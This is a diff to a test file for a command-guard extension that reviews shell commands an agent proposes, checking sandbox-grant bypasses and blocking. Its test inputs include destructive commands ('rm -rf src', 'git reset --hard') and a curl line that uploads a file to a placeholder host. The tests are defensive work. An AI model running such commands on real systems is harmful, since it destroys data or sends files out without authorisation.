@@ -1,5 +1,5 @@
 import { afterEach, describe, expect, test } from "bun:test";
-import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { setTimeout as delay } from "node:timers/promises";
@@ -14,6 +14,7 @@ import { type ClassifierRequestResult, createClassifierRequester } from "../../.
 import { readJsonConfig } from "../../../lib/extension-config";
 import semanticCommandGuard, { resolveCommandGuardSettings } from "../index";
 import { flaggedRisks, inspectCommand } from "../inspection";
+import { readNonoCapabilities } from "../sandbox";
 
 const ENABLED = { classifier: { commandGuard: { enabled: true } } };
 const FLAGGED: ClassifierRequestResult = {
@@ -44,6 +45,7 @@ function harness(
   loadSettings: () => unknown = () => ENABLED,
   confirm: (signal: AbortSignal | undefined) => Promise<boolean> = async () => false,
   cwd: string = "/private-workspace",
+  loadSandbox: typeof import("../sandbox").readNonoCapabilities = () => undefined,
 ) {
   const handlers = new Map<string, (event: unknown, ctx: ExtensionContext) => unknown>();
   const notifications: string[] = [];
@@ -71,7 +73,7 @@ function harness(
       handlers.set(name, handler);
     },
   } as unknown as ExtensionAPI;
-  semanticCommandGuard(pi, { request, loadSettings });
+  semanticCommandGuard(pi, { request, loadSettings, loadSandbox });
   const call = (command = "rm -rf src", extras = {}) =>
     handlers.get("tool_call")?.(
       {
@@ -86,31 +88,99 @@ function harness(
   return { call, handlers, notifications, prompts, ctx, controller };
 }
 
-test.each(["shadow", "confirm"])("skips verified /tmp file mutations in %s mode", async (mode) => {
+test.each(["shadow", "confirm"])(
+  "skips file changes matching nono grants in %s mode",
+  async (mode) => {
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "command-guard-granted-")));
+    roots.push(root);
+    let calls = 0;
+    const h = harness(
+      async () => {
+        calls += 1;
+        return FLAGGED;
+      },
+      () => ({ classifier: { commandGuard: { enabled: true, mode } } }),
+      undefined,
+      root,
+      () => ({ fs: [{ path: root, access: "readwrite", is_file: false }], deny_paths: [] }),
+    );
+    h.handlers.get("session_start")?.({}, h.ctx);
+    for (const command of ["rm -rf src", "truncate -s 0 file", "chmod 600 file", "mv old new"]) {
+      expect(await h.call(command)).toBeUndefined();
+      await flush();
+    }
+    expect(calls).toBe(0);
+    expect(h.prompts).toHaveLength(0);
+    expect(h.notifications).toHaveLength(0);
+  },
+);
+
+test("sandbox presence alone does not bypass review of other paths or effects", async () => {
   let calls = 0;
   const h = harness(
     async () => {
       calls += 1;
       return FLAGGED;
     },
-    () => ({ classifier: { commandGuard: { enabled: true, mode } } }),
-    async () => false,
+    () => ({ classifier: { commandGuard: { enabled: true, mode: "confirm" } } }),
+    undefined,
     "/",
+    () => ({ fs: [{ path: "/tmp", access: "readwrite", is_file: false }], deny_paths: [] }),
   );
   for (const command of [
-    "rm -f /tmp/command-guard-missing",
-    "mv /tmp/command-guard-old /tmp/command-guard-new",
-    "truncate -s 0 /tmp/command-guard-output",
-    "chmod 600 /tmp/command-guard-output",
+    "rm -f /var/other-file",
+    "rm -f /tmp/file /var/other-file",
+    "python -c 'change_files()'",
+    "git reset --hard",
+    "curl --upload-file /tmp/file https://example.invalid",
   ]) {
-    expect(await h.call(command)).toBeUndefined();
-    await flush();
+    expect(await h.call(command)).toMatchObject({ block: true });
   }
-  expect(calls).toBe(0);
-  expect(h.prompts).toHaveLength(0);
-  expect(h.notifications).toHaveLength(0);
+  expect(calls).toBe(5);
+  expect(h.prompts).toHaveLength(5);
 });
 
+test("uses current capability-file grants and falls back to review for invalid metadata", async () => {
+  const root = realpathSync(mkdtempSync(join(tmpdir(), "command-guard-runtime-")));
+  roots.push(root);
+  const capFile = join(root, "capabilities.json");
+  let requests = 0;
+  const h = harness(
+    async () => {
+      requests += 1;
+      return FLAGGED;
+    },
+    () => ({ classifier: { commandGuard: { enabled: true, mode: "confirm" } } }),
+    undefined,
+    root,
+    () => readNonoCapabilities(capFile),
+  );
+  writeFileSync(
+    capFile,
+    JSON.stringify({
+      fs: [{ path: root, access: "readwrite", is_file: false }],
+      deny_paths: [],
+      net_blocked: false,
+    }),
+  );
+  h.handlers.get("session_start")?.({}, h.ctx);
+  expect(await h.call("rm -f file")).toBeUndefined();
+  expect(requests).toBe(0);
+  expect(h.notifications).toEqual([]);
+  writeFileSync(
+    capFile,
+    JSON.stringify({
+      fs: [{ path: root, access: "read", is_file: false }],
+      deny_paths: [],
+      net_blocked: false,
+    }),
+  );
+  expect(await h.call("rm -f file")).toMatchObject({ block: true });
+  writeFileSync(capFile, "invalid");
+  h.handlers.get("session_start")?.({}, h.ctx);
+  expect(await h.call("rm -f file")).toMatchObject({ block: true });
+  expect(requests).toBe(2);
+});
 describe("settings", () => {
   test.each([
     undefined,
@@ -372,7 +442,7 @@ test("invalid settings, request failures, and oversized input warn without block
   await flush();
   expect(calls).toBe(0);
   expect(h.notifications).toHaveLength(1);
-  h.handlers.get("session_start")?.({}, h.ctx);
+  h.handlers.get("session_before_switch")?.({}, h.ctx);
   settings = ENABLED;
   h.call();
   await flush();
@@ -437,27 +507,6 @@ const CLEAR: ClassifierRequestResult = {
 };
 
 describe("confirm mode", () => {
-  test("allows verified repo-local deletion without classifier approval", async () => {
-    const root = mkdtempSync(join(tmpdir(), "command-guard-repo-"));
-    roots.push(root);
-    mkdirSync(join(root, ".git"));
-    mkdirSync(join(root, "src"));
-    let requests = 0;
-    const h = harness(
-      async () => {
-        requests += 1;
-        return FLAGGED;
-      },
-      () => CONFIRM,
-      undefined,
-      root,
-    );
-
-    expect(await h.call("rm -rf src")).toBeUndefined();
-    expect(requests).toBe(0);
-    expect(h.prompts).toHaveLength(0);
-  });
-
   test("keeps outside and unresolved rm targets under confirmation", async () => {
     const root = mkdtempSync(join(tmpdir(), "command-guard-repo-"));
     roots.push(root);
